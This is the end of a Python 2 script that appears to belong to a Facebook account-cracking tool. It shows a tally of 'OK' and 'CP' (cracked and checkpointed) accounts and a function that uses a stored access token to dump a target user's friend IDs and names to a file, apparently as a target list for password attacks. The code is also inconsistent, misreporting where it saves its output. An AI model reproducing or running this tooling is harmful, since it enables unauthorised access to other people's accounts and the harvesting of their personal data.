	print("\033[93;1m TOTAL \033[92;1mOK\033[93;1m/\033[91;1mCP: "+str(len(oks))+"/"+str(len(cps)))
	print("")
	linex()
	print("")
	raw_input("\033[93;1m PRESS ENTER TO BACK ")
	menu()
	

def ex_id():
    global token
    idg = []
    os.system("clear")
    try:
        token = open("vau_token.txt", "r").read()
    except(KeyError , IOError):
        token()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token)
        q = json.loads(r.text)
        name = q["name"]
    except(KeyError):
        logo()
        print("")
        print("\t\033[91;1m  LOGGED IN TOKEN HAS EXPIRED")
        os.system("rm -rf vau_token.txt")
        print("")
        time.sleep(1)
        token()
    os.system('clear')
    logo()
    print ''
    print '\033[91;1m      DUMP PUBLIC ID FRIEND LIST'
    print ''
    idh = raw_input('\033[92;1m   INPUT ID: ')
    try:
        r = requests.get('https://graph.facebook.com/' + idh + '?access_token=' + token, headers=header)
        q = json.loads(r.text)
        print ' COLLECTIN FROM: ' + q['name']
    except KeyError:
        print ''
        print '\033[93;1m\tINVALID ID PROVIDED'
        print ''
        raw_input('\033[93;1m PRESS ENTER TO BACK')
        ex_id()

    r = requests.get('https://graph.facebook.com/' + idh + '/friends?access_token=' + token, headers=header)
    q = json.loads(r.text)
    ids = open('ids_friends.txt', 'w')
    for i in q['data']:
        uid = i['id'].encode('utf-8')
        na = i['name'].encode('utf-8')
        idg.append(uid + '|' + na)
        ids.write(uid + '|' + na + '\n')

    ids.close()
    print ''
    linex()
    print ''
    print '\033[91;1m THE PROCESS HAS COMPLETED'
    print '\033[93;1m TOTAL IDS: \033[92;1m' + str(len(idg))
    print ''
    linex()
    print ''
    raw_input('\033[94;1m PRESS ENTER TO DOWNLOAD FILE')
    print '\033[92;1m FILE DOWNLOADED SUCCESSFULLY'
    print '\033[91;1m SAVED /sdcard/Ahmed.txt'
    print ''
    time.sleep(1)
    ex_id()

if __name__ == '__main__':
	main()
